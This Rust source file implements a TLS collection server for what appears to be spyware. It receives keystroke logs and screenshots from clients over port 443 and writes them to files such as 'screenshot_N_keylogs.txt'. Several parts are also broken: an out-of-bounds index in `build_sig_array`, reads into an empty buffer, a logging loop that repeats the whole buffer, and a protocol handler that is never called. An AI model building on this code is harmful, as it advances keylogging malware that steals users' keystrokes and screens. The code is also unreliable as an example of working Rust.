use std::net::{UdpSocket, TcpListener, TcpStream};
use openssl::ssl::{SslMethod, SslAcceptor, SslStream, SslFiletype};
use std::sync::Arc;
use std::thread;
use std::fs::File;
use std::io::{Read, Write};
use crate::pool::Pool;
const THREADS_MAX: usize = 12;

const LOCAL_DOMAIN: &str = "revy.johnroark.us";
const SIGNAL_SIZE: usize = 4;
const LOCAL_PORT: i32 = 443;
const FRAME_TIME: u128 = 2000;
enum TcpData {Keys(Vec<u8>), Screenshot(Vec<u8>)}
enum TcpSignalClient { AckRecvKeys = 1, AckRecvScreen, AckRecvMeta }
pub struct TLSSocketServer {
    addr: String,
    listener: TcpListener,
    pool: Pool,
    acceptor: Arc<SslAcceptor>
}

impl TLSSocketServer {

    pub fn init(size: Option<usize>) -> TLSSocketServer {
        let pool = {
            match size {
                Some(s) => Pool::new(s),
                None => Pool::new(THREADS_MAX)
            }
        };
        let mut addr = {
            match try_get_default_addr() {
                Some(s) => s,
                None => unimplemented!()
            }
        };
        addr = format!("{}:{}", addr, LOCAL_PORT);
        let listener = TcpListener::bind(&addr).unwrap();
        let mut acceptor = SslAcceptor::mozilla_intermediate(
            SslMethod::tls()
        ).unwrap();
        acceptor.set_private_key_file("key.pem", SslFiletype::PEM).unwrap();
        acceptor.set_certificate_chain_file("certs.pem").unwrap();
        acceptor.check_private_key().unwrap();
        let acceptor = Arc::new(acceptor.build());
        TLSSocketServer { 
            addr: addr,
            pool: pool,
            listener: listener,
            acceptor: acceptor
        }
    }

    pub fn keep_alive(&mut self) {
        let mut i = 1i128;
        for mut stream in self.listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let acceptor = self.acceptor.clone();
                    self.pool.execute(move || {
                        let mut stream = acceptor.accept(stream).unwrap();
                        let mut file = File::create(
                            format!("screenshot_{:?}", i)
                        ).unwrap();
                        let mut buffer = Vec::new();
                        loop {
                            let n = stream.read(&mut buffer).unwrap();
                            if n != 0 { file.write(&buffer).unwrap(); }
                            else { break }
                        }
                    }); i = i + 1;
                }
                Err(e) => { /* connection failed */ }
            }
        }
    }

}

fn read_signal(stream: &mut SslStream<TcpStream>, i: i128) {
    let mut in_buf = [0u8; SIGNAL_SIZE];
    stream.read(&mut in_buf).unwrap();
    match i32::from_be_bytes(in_buf) {
        1 => { // StartSendKeys
            stream.write(&1i32.to_be_bytes()).unwrap();
            let mut in_buffer = vec![0u8; SIGNAL_SIZE];
            stream.read(&mut in_buffer).unwrap();
            let mut file = File::create(
                format!("screenshot_{:?}_keylogs.txt", i)
            ).unwrap();
            loop {
                let n = stream.read(&mut in_buffer).unwrap();
                if n != SIGNAL_SIZE { write_keylogs(&mut file, &in_buffer) }
                else {
                    match i32::from_be_bytes(build_sig_array(&in_buffer)) {
                        2 => break, // EndSendKeys
                        _ => write_keylogs(&mut file, &in_buffer)
                    }
                }
            }
        },
        2 => { // StartSendScreens
            stream.write(&2i32.to_be_bytes()).unwrap();
            let mut in_buffer = vec![0u8; SIGNAL_SIZE];
            stream.read(&mut in_buffer).unwrap();
            let mut file = File::create(
                format!("screenshot_{:?}.jpg", i)
            ).unwrap();
            loop {
                let n = stream.read(&mut in_buffer).unwrap();
                if n != SIGNAL_SIZE { file.write(&in_buffer).unwrap(); }
                else {
                    match i32::from_be_bytes(build_sig_array(&in_buffer)) {
                        2 => break, // EndSendScreen
                        _ => { file.write(&in_buffer).unwrap(); }
                    }
                }
            }
        },
        _ => {}
    }
}

fn build_sig_array(sig: &Vec<u8>) -> [u8; 4] {
    assert!(sig.len() == 4);
    let mut res = [0u8; 4];
    unsafe {
        // this is still safe anyway :)
        res[0] = sig[0]; res[1] = sig[1]; res[2] = sig[2]; res[3] = res[4]
    }
    res
}

fn write_keylogs(file: &mut File, data: &Vec<u8>) {
    for byte in data {
        file.write(&std::str::from_utf8(&data).unwrap().as_bytes());
    }
}

fn try_get_default_addr() -> Option<String> {
	let socket = match UdpSocket::bind("0.0.0.0:0") {
		Ok(s) => s,
		Err(_) => return None,
	};

	match socket.connect("8.8.8.8:80") {
		Ok(()) => (),
		Err(_) => return None,
	};

	match socket.local_addr() {
		Ok(addr) => return Some(addr.ip().to_string()),
		Err(_) => return None,
	};
}